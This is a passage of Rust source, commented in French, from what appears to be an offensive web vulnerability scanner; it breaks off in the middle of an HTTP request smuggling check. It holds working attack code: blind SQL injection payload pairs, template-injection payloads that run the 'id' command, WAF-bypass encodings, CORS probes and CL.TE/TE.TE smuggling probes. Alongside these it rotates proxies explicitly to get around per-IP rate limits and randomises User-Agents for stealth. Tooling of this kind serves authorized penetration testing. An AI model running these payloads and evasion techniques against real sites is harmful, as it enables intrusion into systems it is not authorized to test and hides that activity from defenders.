    // https générique qui perdrait le port.
    let mut candidates: Vec<String> = vec![
        format!("{}://{}", raw_scheme, domain_only),
        format!("https://{}", domain_only),
        format!("https://www.{}", domain_only),
        format!("http://{}", domain_only),
        format!("http://www.{}", domain_only),
    ];
    candidates.dedup();

    let mut best: Option<(u8, String)> = None;
    // Passe 1 : en suivant les redirections (comportement nominal).
    // Passe 2 (repli) : sans suivre les redirections — une origine qui répond
    // un 3xx est vivante, même si la cible de la redirection est injoignable
    // (cas d'un HTTP qui redirige vers un HTTPS filtré ou en panne : suivre la
    // redirection produit un timeout et fait croire à une cible morte).
    for follow in [true, false] {
        let policy = if follow {
            reqwest::redirect::Policy::limited(5)
        } else {
            reqwest::redirect::Policy::none()
        };
        let client = reqwest::Client::builder()
            .timeout(std::cmp::min(cfg.timeout, Duration::from_secs(5)))
            .danger_accept_invalid_certs(true)
            .redirect(policy)
            .user_agent(effective_user_agent(cfg))
            .build()
            .unwrap_or_default();

        for cand in &candidates {
            if let Ok(resp) = client.get(cand).send().await {
                let status = resp.status().as_u16();
                let is_html = resp
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .map(|ct| ct.contains("html"))
                    .unwrap_or(false);
                let body_len = resp.content_length().unwrap_or(0);
                let final_url = resp.url().to_string();

                let mut score: u8 = 0;
                if (200..=299).contains(&status) {
                    score += 40;
                } else if (300..=399).contains(&status) {
                    score += 20;
                } else if (400..=499).contains(&status) && status != 404 {
                    score += 10;
                }
                if is_html {
                    score += 30;
                }
                if body_len > 1024 {
                    score += 15;
                }
                // Privilégier HTTPS (+10) et domaine sans www (+5)
                if cand.starts_with("https://") {
                    score += 10;
                }
                if !cand.contains("://www.") && !final_url.contains("://www.") {
                    score += 5;
                }

                if best.as_ref().map(|(s, _)| *s).unwrap_or(0) < score {
                    // Sans suivi de redirection, on retient l'origine candidate
                    // (l'URL vivante), pas l'URL de redirection.
                    let kept = if !follow && (300..=399).contains(&status) {
                        cand.clone()
                    } else {
                        final_url
                    };
                    best = Some((score, kept));
                }
            }
        }
        if best.is_some() {
            break;
        }
    }

    match best {
        Some((_, url)) => {
            let final_trim = url.trim_end_matches('/').to_string();
            println!(
                "  \x1b[90m[URL]\x1b[0m Normalisation: {} → {} (auto-probed {} variantes)",
                raw,
                final_trim,
                candidates.len()
            );
            final_trim
        }
        None => {
            // Fallback : URL d'origine, schéma + port conservés. Forcer https
            // ici transformait `http://h:80` en `https://h:80` (injoignable).
            let fallback = format!("{}://{}", raw_scheme, domain_only);
            println!(
                "  \x1b[33m[WARN]\x1b[0m Aucune variante HTTP(S) n'a répondu. Fallback: {}",
                fallback
            );
            fallback
        }
    }
}

/// Découvre les paramètres GET d'une page via parsing HTML léger
async fn discover_params(base_url: &str, cfg: &WebAttackConfig) -> Vec<String> {
    let client = build_client(cfg);
    let mut params = Vec::new();
    let mut request_failed = true;

    // P1.1 : retry/backoff — si la requête initiale échoue, tout le scan
    // retombe sur les listes de paramètres par défaut.
    match http_get_headers(&client, base_url, &[], cfg.retries).await {
        Some((status, hmap, body)) => {
            request_failed = false;
            let ct = hmap
                .get("content-type")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            if body.is_empty() || (!ct.contains("html") && !(200..=299).contains(&status)) {
                println!("  \x1b[33m[WARN]\x1b[0m GET {} → {} content-type={} body_bytes={} — tentative quand même",
                    base_url, status, ct, body.len());
            }
            // Extraire les paramètres depuis les formulaires HTML
            if let Ok(re) = regex::Regex::new(r#"name=["\']([^"\']+)["\']"#) {
                for cap in re.captures_iter(&body) {
                    if let Some(m) = cap.get(1) {
                        let val = m.as_str().trim();
                        if !val.is_empty() && val.len() < 64 {
                            params.push(val.to_string());
                        }
                    }
                }
            }
            // Extraire depuis les URLs avec paramètres href/src/action
            if let Ok(re) =
                regex::Regex::new(r#"(?:href|src|action)=["\'][^"\']*\?([^"\'=\s&]+)=[^"\']*["\']"#)
            {
                for cap in re.captures_iter(&body) {
                    if let Some(m) = cap.get(1) {
                        params.push(m.as_str().to_string());
                    }
                }
            }
            if let Ok(re) = regex::Regex::new(r#"\?([^"\'=&#\s]+)="#) {
                for cap in re.captures_iter(&body) {
                    if let Some(m) = cap.get(1) {
                        params.push(m.as_str().to_string());
                    }
                }
            }
        }
        None => {
            println!("  \x1b[31m[ERR]\x1b[0m GET {} impossible : échec réseau après retries — tentative avec params par défaut", base_url);
        }
    }

    if params.is_empty() && request_failed {
        println!("  \x1b[33m[INFO]\x1b[0m Requête initiale en échec → utilisation params courants + CMS courants");
    }

    params.sort();
    params.dedup();
    params
}

/// Curseur global de rotation de proxies : chaque `build_client` avance d'un cran
/// dans le pool, de sorte que des tâches concurrentes sortent par des IP distinctes.
static PROXY_CURSOR: AtomicUsize = AtomicUsize::new(0);

/// User-Agent effectif d'un client : un UA navigateur tiré du pool du profil de
/// furtivité, ou `cfg.user_agent` si le pool est vide. Casse la corrélation
/// triviale « toutes les requêtes portent la signature NRTG ».
fn effective_user_agent(cfg: &WebAttackConfig) -> String {
    let profile = crate::evasion::profile_from_level(&cfg.stealth_level);
    crate::evasion::pick_user_agent(&profile, &cfg.user_agent)
}

/// Concurrence effective des scanners web. Le pacing furtif
/// (`--stealth redteam|stealth|opsec|low`) divise le parallélisme pour rester
/// « low & slow » ; les modes `default`/`off` laissent `cfg.concurrency`
/// inchangé afin de ne pas dégrader un scan nominal.
fn effective_concurrency(cfg: &WebAttackConfig) -> usize {
    paced_concurrency(&cfg.stealth_level, cfg.concurrency)
}

/// Parallélisme effectif : le niveau furtif borne le parallélisme demandé
/// (`--stealth redteam` réduit fortement la concurrence). Partagé avec le
/// spider, qui applique le même pacing à son crawl.
pub(crate) fn paced_concurrency(stealth_level: &str, base: usize) -> usize {
    let base = base.max(1);
    match stealth_level.to_ascii_lowercase().as_str() {
        "" | "off" | "none" | "fast" | "loud" | "default" => base,
        level => {
            crate::evasion::effective_parallelism(&crate::evasion::profile_from_level(level), base)
        }
    }
}

fn build_client(cfg: &WebAttackConfig) -> Client {
    let user_agent = effective_user_agent(cfg);

    let mut builder = reqwest::Client::builder()
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(true)
        .user_agent(&user_agent)
        .default_headers(cfg.auth.to_headers())
        .redirect(if cfg.follow_redirects {
            reqwest::redirect::Policy::limited(5)
        } else {
            reqwest::redirect::Policy::none()
        });

    // P1.3 — rotation de proxy : chaque client construit avance dans le pool,
    // ce qui répartit les requêtes concurrentes sur plusieurs IP sources
    // (contournement du rate-limiting par IP, cloisonnement OPSEC).
    // Les entrées invalides sont sautées ; si aucune n'est utilisable, on
    // retombe explicitement en direct.
    let n = cfg.proxies.len();
    if n > 0 {
        let start = PROXY_CURSOR.fetch_add(1, Ordering::Relaxed);
        for off in 0..n {
            let url = &cfg.proxies[(start + off) % n];
            if let Ok(p) = reqwest::Proxy::all(url) {
                builder = builder.proxy(p);
                break;
            }
        }
    }

    builder.build().unwrap_or_default()
}

/// Token OOB unique pour un paramètre/cible. Vide si aucun canal OOB n'est
/// actif (ni callback HTTP, ni domaine DNS), afin de ne pas ajouter de payloads
/// inutiles. Le même token sert aux canaux HTTP et DNS.
fn oob_token(cfg: &WebAttackConfig) -> String {
    if cfg.ssrf_callback.is_some() || crate::oob::OobListener::dns_domain().is_some() {
        format!("oob{:016x}", rand::random::<u64>())
    } else {
        String::new()
    }
}

/// Taille maximale d'un corps de réponse conservé en mémoire (2 Mio).
/// Sans plafond, une réponse arbitrairement volumineuse — ou un flux infini
/// (fichier de plusieurs Gio servi en chunked) — épuiserait la RAM du poste
/// opérateur. Le flux est abandonné dès la limite atteinte.
const MAX_BODY_BYTES: usize = 2 * 1024 * 1024;

/// Lit un corps de réponse en le tronquant à `MAX_BODY_BYTES`. Ne matérialise
/// jamais plus que la limite : les octets excédentaires sont ignorés au fil du
/// flux (aucune mise en tampon intermédiaire non bornée).
pub(crate) async fn read_body_bounded(resp: reqwest::Response) -> String {
    let mut stream = resp.bytes_stream();
    let mut buf: Vec<u8> = Vec::new();
    while let Some(chunk) = stream.next().await {
        let Ok(bytes) = chunk else { break };
        let remaining = MAX_BODY_BYTES.saturating_sub(buf.len());
        if remaining == 0 {
            break;
        }
        buf.extend_from_slice(&bytes[..bytes.len().min(remaining)]);
    }
    String::from_utf8_lossy(&buf).into_owned()
}

/// GET avec retry + backoff exponentiel (P1.1). Ne retente **que** les erreurs
/// réseau transitoires (timeout, reset, DNS) — jamais une réponse HTTP, même 5xx,
/// car un 500 peut lui-même porter la preuve d'injection et doit être analysé.
/// Retourne (status, body, elapsed_ms) ou `None` si aucun essai n'a abouti.
async fn http_get(client: &Client, url: &str, attempts: usize) -> Option<(u16, String, u128)> {
    let attempts = attempts.max(1);
    let mut delay_ms = 150u64;

    for attempt in 0..attempts {
        let start = std::time::Instant::now();
        match client.get(url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = read_body_bounded(resp).await;
                return Some((status, body, start.elapsed().as_millis()));
            }
            Err(_) if attempt + 1 < attempts => {
                // Jitter pour éviter la synchronisation des workers concurrents
                let jitter = rand::random::<u64>() % 120;
                tokio::time::sleep(Duration::from_millis(delay_ms + jitter)).await;
                delay_ms = (delay_ms * 2).min(2_000);
            }
            Err(_) => return None,
        }
    }
    None
}

/// GET avec en-têtes de requête personnalisés + retry, **en conservant les en-têtes
/// de réponse** (requis par CORS/OAuth2 qui analysent `Location` et `Access-Control-*`).
async fn http_get_headers(
    client: &Client,
    url: &str,
    headers: &[(&str, &str)],
    attempts: usize,
) -> Option<(u16, reqwest::header::HeaderMap, String)> {
    let attempts = attempts.max(1);
    let mut delay_ms = 150u64;

    for attempt in 0..attempts {
        let mut req = client.get(url);
        for (k, v) in headers {
            req = req.header(*k, *v);
        }
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let hmap = resp.headers().clone();
                let body = read_body_bounded(resp).await;
                return Some((status, hmap, body));
            }
            Err(_) if attempt + 1 < attempts => {
                let jitter = rand::random::<u64>() % 120;
                tokio::time::sleep(Duration::from_millis(delay_ms + jitter)).await;
                delay_ms = (delay_ms * 2).min(2_000);
            }
            Err(_) => return None,
        }
    }
    None
}

/// POST form-urlencoded avec la même politique de retry que `http_get` (P1.1).
async fn http_post_form(
    client: &Client,
    url: &str,
    form: &[(&str, &str)],
    attempts: usize,
) -> Option<(u16, String, u128)> {
    let attempts = attempts.max(1);
    let mut delay_ms = 150u64;

    for attempt in 0..attempts {
        let start = std::time::Instant::now();
        match client.post(url).form(form).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = read_body_bounded(resp).await;
                return Some((status, body, start.elapsed().as_millis()));
            }
            Err(_) if attempt + 1 < attempts => {
                let jitter = rand::random::<u64>() % 120;
                tokio::time::sleep(Duration::from_millis(delay_ms + jitter)).await;
                delay_ms = (delay_ms * 2).min(2_000);
            }
            Err(_) => return None,
        }
    }
    None
}

/// POST avec corps brut (ex: `php://input`, JSON) et la même politique de retry (P1.1).
async fn http_post_raw(
    client: &Client,
    url: &str,
    body: &str,
    content_type: Option<&str>,
    attempts: usize,
) -> Option<(u16, String, u128)> {
    let attempts = attempts.max(1);
    let mut delay_ms = 150u64;

    for attempt in 0..attempts {
        let start = std::time::Instant::now();
        let mut req = client.post(url);
        if let Some(ct) = content_type {
            req = req.header("Content-Type", ct);
        }
        match req.body(body.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = read_body_bounded(resp).await;
                return Some((status, text, start.elapsed().as_millis()));
            }
            Err(_) if attempt + 1 < attempts => {
                let jitter = rand::random::<u64>() % 120;
                tokio::time::sleep(Duration::from_millis(delay_ms + jitter)).await;
                delay_ms = (delay_ms * 2).min(2_000);
            }
            Err(_) => return None,
        }
    }
    None
}

/// Détecte une réponse de blocage WAF : statut dédié ou page de challenge.
/// Sert uniquement à déclencher un nouvel essai avec un encodage alternatif —
/// jamais à conclure à une vulnérabilité.
fn is_waf_blocked(status: u16, body: &str) -> bool {
    if matches!(status, 401 | 403 | 406 | 407 | 429 | 503) {
        return true;
    }
    let l = body.to_lowercase();
    if l.len() > 8192 {
        return false; // page volumineuse = probablement pas un challenge WAF
    }
    [
        "cloudflare",
        "attention required",
        "access denied",
        "request blocked",
        "web application firewall",
        "mod_security",
        "not acceptable",
        "captcha",
        "sucuri",
        "incapsula",
        "imperva",
    ]
    .iter()
    .any(|m| l.contains(m))
}

/// Variantes d'encodage « tamper » rejouées quand le payload brut est filtré (P0.2).
/// Retourne (libellé, payload transformé).
fn tamper_variants(payload: &str) -> Vec<(&'static str, String)> {
    let mut out: Vec<(&'static str, String)> = Vec::new();

    // Double encodage URL : contourne les normalisations uniques
    out.push((
        "double-url",
        urlencoding::encode(&urlencoding::encode(payload)).to_string(),
    ));

    // Commentaires SQL inline : cassent les signatures « UNION SELECT » / « OR 1=1 »
    if payload.contains(' ') {
        out.push(("sql-comment", payload.replace(' ', "/**/")));
    }

    // Casse alternée : « SeLeCt » — les mots-clés SQL restent insensibles à la casse
    let swapped: String = payload
        .chars()
        .enumerate()
        .map(|(i, c)| {
            if c.is_ascii_alphabetic() && i % 2 == 1 {
                c.to_ascii_uppercase()
            } else {
                c.to_ascii_lowercase()
            }
        })
        .collect();
    out.push(("case-swap", swapped));

    // Séparateurs alternatifs (tabulation / retour ligne) souvent non filtrés
    if payload.contains(' ') {
        out.push(("whitespace", payload.replace(' ', "%09")));
    }

    out
}

/// Rejoue un payload (XSS/LFI/CMDi…) avec des variantes d'encodage quand un WAF
/// a filtré la requête brute (P0.2). `check` inspecte (body, status) et retourne
/// l'évidence si la vulnérabilité est confirmée, sinon `None`.
async fn tamper_retry<F>(
    client: &Client,
    base_url: &str,
    param: &str,
    payload: &str,
    retries: usize,
    check: F,
) -> Option<String>
where
    F: Fn(&str, u16) -> Option<String>,
{
    for (label, variant) in tamper_variants(payload) {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&variant));
        if let Some((status, body, _)) = http_get(client, &test_url, retries).await {
            if let Some(ev) = check(&body, status) {
                println!(
                    "  \x1b[38;5;196m[TAMPER:{}]\x1b[0m {} param={} payload='{}'",
                    label, base_url, param, variant
                );
                return Some(format!("[tamper:{}] {}", label, ev));
            }
        }
    }
    None
}

/// Confirme une détection time-based par N échantillons supplémentaires (P0.3).
/// Un unique délai anormal est un faux positif classique (jitter réseau, GC,
/// cache froid) : on exige que la majorité des tirs soient effectivement retardés.
async fn confirm_time_based(
    client: &Client,
    base_url: &str,
    param: &str,
    payload: &str,
    samples: usize,
    threshold_ms: u128,
) -> bool {
    if samples == 0 {
        return true;
    }
    let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
    let mut delayed = 0usize;
    for _ in 0..samples {
        let start = std::time::Instant::now();
        if let Ok(resp) = client.get(&test_url).send().await {
            // Consommer le corps pour un timing fiable, mais borné : le délai
            // mesuré doit refléter le traitement serveur, pas le téléchargement
            // d'une réponse géante.
            let _ = read_body_bounded(resp).await;
            if start.elapsed().as_millis() >= threshold_ms {
                delayed += 1;
            }
        }
    }
    delayed * 2 > samples // majorité stricte
}

/// Rejoue un payload SQLi avec des variantes d'encodage d'évasion WAF (GET).
async fn probe_tampered(
    client: &Client,
    base_url: &str,
    param: &str,
    payload: &str,
    evidence_pattern: &str,
    baseline: &Option<(String, u16, u128)>,
    baseline_has_sql_error: bool,
    retries: usize,
) -> Option<WebVuln> {
    for (label, variant) in tamper_variants(payload) {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&variant));
        if let Some((status, body, elapsed)) = http_get(client, &test_url, retries).await {
            if let Some(mut v) = detect_sqli_response_checked(
                &body,
                status,
                elapsed,
                &variant,
                evidence_pattern,
                &test_url,
                param,
                baseline,
                baseline_has_sql_error,
            ) {
                v.evidence = format!("[tamper:{}] {}", label, v.evidence);
                println_payload_log("SQLi/TAMPER", &test_url, param, &variant, &v.evidence);
                return Some(v);
            }
        }
    }
    None
}

// ─────────────────────────────────────────────────────────────────────────────
// 10. SQLi Boolean-Based Blind
// ─────────────────────────────────────────────────────────────────────────────

/// Détection SQLi par comparaison de 2 réponses (TRUE vs FALSE condition)
/// C'est la méthode la plus fiable quand il n'y a pas d'erreur visible
pub async fn scan_sqli_boolean_blind(
    base_url: &str,
    params: &[&str],
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — un paramètre par tâche, concurrence bornée.
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_sqli_blind_param(&client, base_url, &param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Compare les réponses TRUE/FALSE d'un paramètre pour détecter un blind boolean.
async fn probe_sqli_blind_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns = Vec::new();

    // Paires (true_payload, false_payload) — les réponses doivent être différentes
    let boolean_pairs: &[(&str, &str)] = &[
        ("1 AND 1=1", "1 AND 1=2"), // Basique
        ("1 AND 2>1", "1 AND 1>2"),
        ("' AND '1'='1", "' AND '1'='2"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("1' AND 1=1--", "1' AND 1=2--"),
        (
            "1 AND SUBSTRING(VERSION(),1,1)='5'",
            "1 AND SUBSTRING(VERSION(),1,1)='X'",
        ), // MySQL
        ("1 AND 1=1 LIMIT 1", "1 AND 1=2 LIMIT 1"),
    ];

    // D'abord obtenir la réponse baseline (valeur normale)
    let baseline_url = format!("{}?{}=1", base_url, param);
    let baseline_body = match http_get(client, &baseline_url, cfg.retries).await {
        Some((_, b, _)) => b,
        None => return vulns,
    };
    let baseline_len = baseline_body.len();

    for (true_payload, false_payload) in boolean_pairs {
        // Réponse TRUE
        let true_url = format!(
            "{}?{}={}",
            base_url,
            param,
            urlencoding::encode(true_payload)
        );
        let true_body = match http_get(client, &true_url, cfg.retries).await {
            Some((_, b, _)) => b,
            None => continue,
        };

        // Réponse FALSE
        let false_url = format!(
            "{}?{}={}",
            base_url,
            param,
            urlencoding::encode(false_payload)
        );
        let false_body = match http_get(client, &false_url, cfg.retries).await {
            Some((_, b, _)) => b,
            None => continue,
        };

        let true_len = true_body.len();
        let false_len = false_body.len();

        // Si la réponse TRUE ≈ baseline ET la réponse FALSE est significativement différente
        // → SQLi boolean-based confirmé
        let true_similar_baseline = diff_ratio(true_len, baseline_len) > 0.90;
        let false_differs = diff_ratio(false_len, true_len) < 0.85;
        let significant_difference = true_len.abs_diff(false_len) > 50; // > 50 bytes diff

        if true_similar_baseline && false_differs && significant_difference {
            println!(
                "  \x1b[38;5;196m[SQLi BLIND]\x1b[0m {} param={} TRUE={}B FALSE={}B (diff={}B)",
                base_url,
                param,
                true_len,
                false_len,
                true_len.abs_diff(false_len)
            );

            vulns.push(WebVuln {
                vuln_type:   "SQL Injection (Boolean-Based Blind)".into(),
                url:         base_url.to_string(),
                parameter:   param.to_string(),
                payload:     format!("TRUE: {} | FALSE: {}", true_payload, false_payload),
                evidence:    format!(
                    "Réponse TRUE ({} bytes) ≠ réponse FALSE ({} bytes) — différence significative {}B confirme la condition SQL",
                    true_len, false_len, true_len.abs_diff(false_len)
                ),
                severity:    "CRITICAL".into(),
                confidence:  0.85,
                remediation: "Utiliser des requêtes préparées. Auditer tous les points d'entrée SQL.".into(),
            });
            break;
        }
    }

    vulns
}

/// Ratio de similarité entre 2 longueurs (0.0 = totalement différent, 1.0 = identique)
fn diff_ratio(a: usize, b: usize) -> f64 {
    if a == 0 && b == 0 {
        return 1.0;
    }
    let max = a.max(b) as f64;
    let min = a.min(b) as f64;
    min / max
}

// ═════════════════════════════════════════════════════════════════════════════
// SSTI — Server-Side Template Injection
// Détection pour : Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, Pebble
// ═════════════════════════════════════════════════════════════════════════════

/// Retourne les payloads SSTI avec le moteur attendu et le pattern de détection
/// Payloads SSTI embarqués, complétés par les payloads externes (`ext.ssti`).
fn ssti_payloads(ext: &ExternalPayloads) -> Vec<(String, String, String)> {
    let mut out: Vec<(String, String, String)> = vec![
        // (payload, engine_hint, evidence_pattern)
        // ── Jinja2 / Flask (Python) ──────────────────────────────────────────
        ("{{7*7}}", "Jinja2/Twig", "49"),
        ("{{7*'7'}}", "Jinja2", "7777777"),
        ("{{config}}", "Jinja2", "SECRET_KEY"),
        ("{{request.environ}}", "Jinja2", "SERVER_SOFTWARE"),
        (
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "Jinja2",
            "subprocess",
        ),
        // ── Twig (PHP) ───────────────────────────────────────────────────────
        (
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            "Twig",
            "Error",
        ),
        ("{{'7'*7}}", "Twig", "7777777"),
        // ── Freemarker (Java) ────────────────────────────────────────────────
        ("${7*7}", "Freemarker", "49"),
        (
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
            "Freemarker",
            "uid=",
        ),
        // ── Velocity (Java) ──────────────────────────────────────────────────
        ("#set($x=7*7)$x", "Velocity", "49"),
        // ── Smarty (PHP) ─────────────────────────────────────────────────────
        ("{php}echo `id`;{/php}", "Smarty", "uid="),
        ("{{7*7}}", "Smarty", "49"),
        // ── Mako (Python) ────────────────────────────────────────────────────
        ("${7*7}", "Mako", "49"),
        ("<%import os%>${os.popen('id').read()}", "Mako", "uid="),
        // ── Pebble (Java) ────────────────────────────────────────────────────
        ("{{7*7}}", "Pebble", "49"),
        // ── Expression Language (Java) ───────────────────────────────────────
        ("${7*7}", "EL/JSP", "49"),
        ("#{7*7}", "EL2", "49"),
        // ── Ruby ERB ────────────────────────────────────────────────────────
        ("<%= 7*7 %>", "ERB", "49"),
        ("<%= `id` %>", "ERB", "uid="),
        // ── Go templates ────────────────────────────────────────────────────
        ("{{.}}", "Go", "map["),
    ]
    .into_iter()
    .map(|(p, e, m)| (p.to_string(), e.to_string(), m.to_string()))
    .collect();
    out.extend(ext.ssti.iter().cloned());
    out
}

/// Scan SSTI sur tous les paramètres GET/POST fournis
pub async fn scan_ssti(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — un paramètre par tâche, concurrence bornée.
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_ssti_param(&client, base_url, &param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Teste un paramètre sur tous les moteurs de templates connus.
async fn probe_ssti_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns = Vec::new();

    for (payload, engine, evidence_pattern) in ssti_payloads(&cfg.external) {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&payload));
        let body = match http_get(client, &test_url, cfg.retries).await {
            Some((_, b, _)) => b,
            None => continue,
        };

        if body.contains(&evidence_pattern) && !body.contains(&payload) {
            // Le payload a été évalué — c'est du SSTI
            println!(
                "  \x1b[38;5;196m[SSTI]\x1b[0m {} param={} engine={} evidence={}",
                base_url, param, engine, evidence_pattern
            );
            vulns.push(WebVuln {
                vuln_type:   format!("SSTI ({})", engine),
                url:         test_url,
                parameter:   param.to_string(),
                payload:     payload.to_string(),
                evidence:    format!("Expression évaluée → '{}' trouvé dans la réponse", evidence_pattern),
                severity:    if evidence_pattern.contains("uid=") || evidence_pattern.contains("subprocess") {
                    "CRITICAL"
                } else {
                    "HIGH"
                }.to_string(),
                confidence:  0.92,
                remediation: format!(
                    "Moteur {} : ne jamais interpoler des entrées utilisateur dans les templates. \
                     Utiliser un contexte de rendu isolé (sandboxed). \
                     Valider et assainir toutes les entrées avant transmission au moteur de templates.",
                    engine
                ),
            });
            break; // Un seul finding par paramètre suffit
        }
    }
    vulns
}

// ═════════════════════════════════════════════════════════════════════════════
// CORS Misconfiguration
// ═════════════════════════════════════════════════════════════════════════════

/// Teste les misconfigrations CORS (origin reflection, null origin, wildcard)
pub async fn scan_cors(base_url: &str, cfg: &WebAttackConfig) -> Vec<WebVuln> {
    let client = build_client(cfg);
    let mut vulns = Vec::new();

    // Origines à tester (OPSEC : domaines réservés IANA uniquement)
    let test_origins = [
        "https://example.org",
        "null",
        "https://trusted.example.org",
        &format!("{}x", base_url), // prefix match bypass
    ];

    for origin in &test_origins {
        // P1.1 : retry/backoff sur erreur réseau + conservation des en-têtes de réponse
        let (_, hmap, _) =
            match http_get_headers(&client, base_url, &[("Origin", *origin)], cfg.retries).await {
                Some(r) => r,
                None => continue,
            };

        let acao = hmap
            .get("access-control-allow-origin")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        let acac = hmap
            .get("access-control-allow-credentials")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_lowercase();

        // Cas 1 : origin reflété tel quel + credentials:true → critique
        if acao == *origin && acac == "true" {
            println!(
                "  \x1b[38;5;196m[CORS CRITICAL]\x1b[0m Origin {} reflété + credentials=true",
                origin
            );
            vulns.push(WebVuln {
                vuln_type:   "CORS Misconfiguration (Credentials Reflection)".into(),
                url:         base_url.to_string(),
                parameter:   "Origin header".into(),
                payload:     origin.to_string(),
                evidence:    format!("ACAO: {}  ACAC: true", acao),
                severity:    "CRITICAL".into(),
                confidence:  0.97,
                remediation: "Utiliser une liste blanche stricte d'origines autorisées. \
                              Ne jamais refléter l'en-tête Origin dynamiquement avec credentials=true.".into(),
            });
        }
        // Cas 2 : null origin accepté (iframe sandbox, redirects)
        else if acao == "null" || (*origin == "null" && acao == "null") {
            println!("  \x1b[38;5;196m[CORS HIGH]\x1b[0m Origin null accepté");
            vulns.push(WebVuln {
                vuln_type: "CORS Misconfiguration (Null Origin)".into(),
                url: base_url.to_string(),
                parameter: "Origin: null".into(),
                payload: "null".into(),
                evidence: "Access-Control-Allow-Origin: null".into(),
                severity: "HIGH".into(),
                confidence: 0.90,
                remediation: "Rejeter explicitement l'origin 'null'. \
                              Utilisable via iframe sandbox ou redirects pour CSRF."
                    .into(),
            });
        }
        // Cas 3 : wildcard (moins sévère sans credentials)
        else if acao == "*" {
            vulns.push(WebVuln {
                vuln_type:   "CORS Misconfiguration (Wildcard)".into(),
                url:         base_url.to_string(),
                parameter:   "Origin header".into(),
                payload:     "*".into(),
                evidence:    "Access-Control-Allow-Origin: *".into(),
                severity:    "MEDIUM".into(),
                confidence:  0.85,
                remediation: "Remplacer * par une liste blanche d'origines autorisées si l'API n'est pas publique.".into(),
            });
        }
        // Cas 4 : origin reflété sans credentials (information disclosure)
        else if acao == *origin && acac != "true" {
            vulns.push(WebVuln {
                vuln_type: "CORS Misconfiguration (Origin Reflection)".into(),
                url: base_url.to_string(),
                parameter: "Origin header".into(),
                payload: origin.to_string(),
                evidence: format!("ACAO: {} reflété dynamiquement (sans credentials)", acao),
                severity: "MEDIUM".into(),
                confidence: 0.75,
                remediation:
                    "Valider Origin contre liste blanche explicite, pas refléter dynamiquement."
                        .into(),
            });
        }
    }
    vulns
}

// ═════════════════════════════════════════════════════════════════════════════
// HTTP Request Smuggling (CL.TE / TE.CL / TE.TE)
// ═════════════════════════════════════════════════════════════════════════════

/// Détecte le HTTP Request Smuggling (CL.TE et TE.CL) via timing et différences de réponses
pub async fn scan_http_smuggling(base_url: &str, cfg: &WebAttackConfig) -> Vec<WebVuln> {
    let client = build_client(cfg);
    let mut vulns = Vec::new();

    // NOTE P1.1 : pas de retry ici volontairement.
    //  - La détection CL.TE/TE.CL repose sur le **délai** mesuré ; un retry sur
    //    timeout ferait passer une sonde valide pour une erreur réseau.
    //  - Les sondes exigent des en-têtes dupliqués (TE: chunked + TE: x-chunked)
    //    que les helpers http_* n'expriment pas.
    // La politique de retry reste donc limitée aux scanners applicatifs.

    // ── CL.TE : Content-Length pris par le front-end, Transfer-Encoding par le back-end
    // Si le back-end traite TE, il attendra la suite du chunk après le "0\r\n\r\n"
    // ce qui provoque un timeout ou une réponse anormale.
    let cl_te_probe = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG";
    let host = base_url
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split('/')
        .next()
        .unwrap_or("target");

    // Mesurer baseline
    let t0 = std::time::Instant::now();
    let _ = client.post(base_url).body("test=1").send().await;
    let baseline_ms = t0.elapsed().as_millis();

    // Test CL.TE : envoyer une requête malformée et mesurer le délai
    let t1 = std::time::Instant::now();
    let smuggle_result = client
        .post(base_url)
        .header("Content-Length", "4")
        .header("Transfer-Encoding", "chunked")
        .header("Transfer-Encoding", "x-chunked") // TE.TE obfuscation
        .body("1\r\nZ\r\n0\r\n\r\n")
        .send()
        .await;
    let smuggle_ms = t1.elapsed().as_millis();

    match smuggle_result {
        Ok(resp) => {
            let status = resp.status().as_u16();
            // Si le serveur répond différemment à la requête malformée
            if status == 400 || status == 501 || smuggle_ms > baseline_ms + 3000 {
                let (severity, description) = if smuggle_ms > baseline_ms + 3000 {
                    (
                        "HIGH",
                        "Délai suspect — possible CL.TE smuggling (backend attend données chunked)",
                    )
                } else {
                    (
                        "MEDIUM",
                        "Réponse 400/501 à requête TE malformée — possible désynchronisation",
                    )
                };
                println!(
